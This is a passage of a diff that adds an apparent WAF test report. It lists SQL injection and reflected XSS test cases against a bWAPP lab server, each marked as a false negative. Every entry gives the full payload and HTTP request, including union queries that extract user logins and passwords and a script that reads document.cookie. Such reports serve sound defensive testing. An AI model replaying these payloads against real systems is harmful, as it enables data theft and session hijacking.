+											<td class="option-value"><pre>OWASP_A1_21</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>SQL Injection (GET/Search)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A1.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/sqli_1.php?title=adsf&#39;%20or%201%3D1%20--%201&amp;action=search</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>adsf&#39; or 1=1 -- 1</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/sqli_1.php?title=adsf&#39;%20or%201%3D1%20--%201&amp;action=search HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A1_22</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A1_22</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>SQL Injection (GET/Search)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A1.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/sqli_1.php?title=asdf&#39;%20union%20select%201,2,3,4,5,6,7%23&amp;action=search</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>asdf&#39; union select 1,2,3,4,5,6,7#</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/sqli_1.php?title=asdf&#39;%20union%20select%201,2,3,4,5,6,7%23&amp;action=search HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A1_23</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A1_23</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>SQL Injection (GET/Search)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A1.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/sqli_1.php?title=asdf&#39;%20union%20select%201,version(),3,4,5,6,7%23&amp;action=search</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>asdf&#39; union select 1,version(),3,4,5,6,7#</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/sqli_1.php?title=asdf&#39;%20union%20select%201,version(),3,4,5,6,7%23&amp;action=search HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A1_24</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A1_24</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>SQL Injection (GET/Search)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A1.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/sqli_1.php?title=asdf&#39;%20union%20select%201,table_name,3,4,5,6,7%20from%20information_schema.tables%23&amp;action=search</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>asdf&#39; union select 1,table_name,3,4,5,6,7 from information_schema.tables#</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/sqli_1.php?title=asdf&#39;%20union%20select%201,table_name,3,4,5,6,7%20from%20information_schema.tables%23&amp;action=search HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A1_25</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A1_25</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>SQL Injection (GET/Search)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A1.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/sqli_1.php?title=asdf&#39;%20union%20select%201,column_name,3,4,5,6,7%20from%20information_schema.columns%20where%20table_name%3D%22users%22%23&amp;action=search</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>asdf&#39; union select 1,column_name,3,4,5,6,7 from information_schema.columns where table_name=&#34;users&#34;#</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/sqli_1.php?title=asdf&#39;%20union%20select%201,column_name,3,4,5,6,7%20from%20information_schema.columns%20where%20table_name%3D%22users%22%23&amp;action=search HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A1_26</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A1_26</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>SQL Injection (GET/Search)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A1.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/sqli_1.php?title=asdf&#39;%20union%20select%201,login,password,4,5,6,7%20from%20users%23&amp;action=search</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>asdf&#39; union select 1,login,password,4,5,6,7 from users#</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/sqli_1.php?title=asdf&#39;%20union%20select%201,login,password,4,5,6,7%20from%20users%23&amp;action=search HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A3_01</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A3_01</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>XSS - Reflected (GET)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A3.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/xss_get.php?firstname=%3Cscript%3Ealert(0)%3B%3C%2Fscript%3E&amp;lastname=%3Cscript%3Ealert(0)%3B%3C%2Fscript%3E&amp;form=submit</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&lt;script&gt;alert(0);&lt;/script&gt;</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/xss_get.php?firstname=%3Cscript%3Ealert(0)%3B%3C%2Fscript%3E&amp;lastname=%3Cscript%3Ealert(0)%3B%3C%2Fscript%3E&amp;form=submit HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A3_01</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A3_01</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>XSS - Reflected (GET)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A3.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/xss_get.php?firstname=%3Cscript%3Ealert(0)%3B%3C%2Fscript%3E&amp;lastname=%3Cscript%3Ealert(0)%3B%3C%2Fscript%3E&amp;form=submit</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&lt;script&gt;alert(0);&lt;/script&gt;</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/xss_get.php?firstname=%3Cscript%3Ealert(0)%3B%3C%2Fscript%3E&amp;lastname=%3Cscript%3Ealert(0)%3B%3C%2Fscript%3E&amp;form=submit HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A3_02</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A3_02</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>XSS - Reflected (GET)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A3.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/xss_get.php?firstname=%3Cscript%3Ealert(%22MME%20r0cks!%22)%3B%3C%2Fscript%3E&amp;lastname=%3Cscript%3Ealert(%22MME%20r0cks!%22)%3B%3C%2Fscript%3E&amp;form=submit</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&lt;script&gt;alert(&#34;MME r0cks!&#34;);&lt;/script&gt;</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/xss_get.php?firstname=%3Cscript%3Ealert(%22MME%20r0cks!%22)%3B%3C%2Fscript%3E&amp;lastname=%3Cscript%3Ealert(%22MME%20r0cks!%22)%3B%3C%2Fscript%3E&amp;form=submit HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A3_03</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A3_03</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>XSS - Reflected (GET)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A3.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/xss_get.php?firstname=%3Cscript%3Ealert(String.fromCharCode(77,77,69,32,114,48,99,107,115,33))%3C%2Fscript%3E&amp;lastname=%3Cscript%3Ealert(String.fromCharCode(77,77,69,32,114,48,99,107,115,33))%3C%2Fscript%3E&amp;form=submit</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&lt;script&gt;alert(String.fromCharCode(77,77,69,32,114,48,99,107,115,33))&lt;/script&gt;</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/xss_get.php?firstname=%3Cscript%3Ealert(String.fromCharCode(77,77,69,32,114,48,99,107,115,33))%3C%2Fscript%3E&amp;lastname=%3Cscript%3Ealert(String.fromCharCode(77,77,69,32,114,48,99,107,115,33))%3C%2Fscript%3E&amp;form=submit HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A3_04</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A3_04</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>XSS - Reflected (GET)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A3.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/xss_get.php?firstname=%3Cscript%3Ealert(document.cookie)%3B%3C%2Fscript%3E&amp;lastname=%3Cscript%3Ealert(document.cookie)%3B%3C%2Fscript%3E&amp;form=submit</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/xss_get.php?firstname=%3Cscript%3Ealert(document.cookie)%3B%3C%2Fscript%3E&amp;lastname=%3Cscript%3Ealert(document.cookie)%3B%3C%2Fscript%3E&amp;form=submit HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
+
+
+
+
+
+
+
+			<div class="attack">
+				<div class="attack-header">
+					
+					<div class="attack-level"></div>
+					<div class="attack-main-info">
+						<div class="attack-type-name-level-high">False Negative  - OWASP_A3_07</div>
+					</div>
+					
+				</div>
+				<div class="attack-body">
+					<div class="attack-info">
+						<table class="attack-root-table">
+							<tr>
+								<td class="attack-statuses-cell">
+									<div class="attack-statuses"></div>
+								</td>
+								<td>
+									<table class="attack-detail-info">
+									
+										<tr>
+											<td class="option-description">Attack ID</td>
+											<td class="option-value"><pre>OWASP_A3_07</pre></td>
+										</tr>
+									
+									
+										<tr>
+											<td class="option-description">Attack Description</td>
+											<td class="option-value"><pre>XSS - Reflected (AJAX/XML)</pre></td>
+										</tr>
+									
+										<tr>
+											<td class="option-description">File</td>
+											<td class="option-value"><pre>owasp/OWASP_A3.json</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">URI</td>
+											<td class="option-value"><pre>http://172.16.9.69:80/bWAPP/xss_ajax_1-2.php?title=&lt;html xmlns=&#39;http://www.w3.org/1999/xhtml&#39;&gt;&lt;script&gt;alert(0)&lt;/script&gt;&lt;/html&gt;</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Payload</td>
+											<td class="option-value"><pre>&lt;html xmlns=&#39;http://www.w3.org/1999/xhtml&#39;&gt;&lt;script&gt;alert(0)&lt;/script&gt;&lt;/html&gt;</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">HTTP-requst</td>
+											<td class="option-value"><pre>GET /bWAPP/xss_ajax_1-2.php?title=%3Chtml%20xmlns=&#39;http://www.w3.org/1999/xhtml&#39;%3E%3Cscript%3Ealert(0)%3C/script%3E%3C/html%3E HTTP/1.1
+Host: 172.16.9.69:80
+Referer: http://172.16.9.69/
+User-Agent: Mozilla/5.0 Windows NT 6.3; Win64; x64 AppleWebKit/537.36 KHTML, like Gecko Chrome/44.0.2403.107 Safari/537.36
+Cookie: session-cookie=146b50d51d9d441bac100906d21407331cc9dbfef3802b3c64143cf8294fe4cf46c52160c67005fc318a8d78ae85dfff
+Connection: keep-alive
+
+</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Detect type</td>
+											<td class="option-value"><pre>status_code</pre></td>
+										</tr>
+                    
+										<tr>
+											<td class="option-description">Expected result</td>
+											<td class="option-value"><pre>Block</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Actual result</td>
+											<td class="option-value"><pre>Passed</pre></td>
+										</tr>
+										<tr>
+											<td class="option-description">Response length</td>
+											<td class="option-value"><pre>536</pre></td>
+										</tr>
+									</table>
+								</td>
+							</tr>
+						</table>
+					</div>
+				</div>
+			</div>
